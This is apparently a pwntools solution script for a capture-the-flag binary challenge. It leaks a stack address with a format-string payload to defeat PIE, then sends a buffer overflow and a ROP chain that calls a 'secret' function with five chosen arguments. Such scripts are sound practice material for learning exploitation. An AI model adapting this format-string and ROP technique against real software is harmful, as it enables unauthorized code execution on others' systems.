from pwn import *
import sys

elf = context.binary = ELF('../dist/password')

if len(sys.argv) > 1 and sys.argv[1] == "send":
    p = remote("ctf-chall.stembascc.com", 6055)
else:
    p = process()

# gdb.attach(p) 

p.sendlineafter(b"Enter password\n: ", b"password")
p.sendlineafter(b"Password is incorrect\n: ", b"incorrect")
p.sendlineafter(b"Try again\n: ", b"again")
p.sendlineafter(b"Please try again later\n: ", b"again later")

p.recvuntil(b"What percentage do you remember the password?\n: ")
p.sendline(b'%23$p')

p.recvuntil(b"like this? ")
leaked_addr = int(p.recvline().strip(), 16)
log.info(f"Leaked Address: {hex(leaked_addr)}")

aligned_leak = leaked_addr & 0xFFFFFFFFFFFFF000
offset = leaked_addr - aligned_leak
elf.address = leaked_addr - offset - 0x1000
log.success(f'PIE base: {hex(elf.address)}')

pop_rdi = elf.symbols['pop']
pop_rsi = pop_rdi + 2
pop_rdx = pop_rsi + 2
pop_rcx = pop_rdx + 2
pop_r8  = pop_rcx + 2

secret_func = elf.symbols['secret']

a_arg = 0xdeadbeefdeadbeef
b_arg = 0xc0debabec0debabe
c_arg = 0x4141414141414141
d_arg = 0x4242424242424242
e_arg = 0x4343434343434343
ret = 0x0000000000001016

payload = b"A" * 72
payload += p64(pop_rdi)
payload += p64(a_arg)
payload += p64(pop_rsi)
payload += p64(b_arg)
payload += p64(pop_rdx)
payload += p64(c_arg)
payload += p64(pop_rcx)
payload += p64(d_arg)
payload += p64(pop_r8)
payload += p64(e_arg)
payload += p64(secret_func)

p.sendlineafter(b"Please try ......\n: ", payload)

print(p.clean().decode('latin-1'))